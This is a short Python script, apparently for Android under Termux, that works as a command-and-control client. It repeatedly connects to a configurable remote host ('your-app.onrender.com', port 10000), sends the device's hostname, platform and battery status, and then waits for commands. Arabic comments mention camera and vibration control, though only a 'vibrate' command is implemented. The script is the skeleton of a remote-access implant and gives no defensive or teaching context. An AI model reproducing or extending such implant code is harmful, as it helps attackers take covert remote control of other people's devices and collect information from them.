import socket, os, platform, json, psutil, time

C2_HOST = "your-app.onrender.com"
C2_PORT = 10000

def get_sys_info():
    battery = psutil.sensors_battery()
    return {
        "hostname": socket.gethostname(),
        "platform": platform.system(),
        "battery": battery.percent if battery else "N/A",
        "charging": battery.power_plugged if battery else False
    }

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_HOST, C2_PORT))
            
            # إرسال "الهوية" فور الاتصال
            s.send(json.dumps(get_sys_info()).encode())
            
            while True:
                data = s.recv(1024).decode()
                if not data: break
                # تنفيذ الأوامر (كاميرا، اهتزاز، إلخ...)
                if "vibrate" in data: os.system("termux-vibrate")
            s.close()
        except:
            time.sleep(20)

if __name__ == "__main__":
    connect()
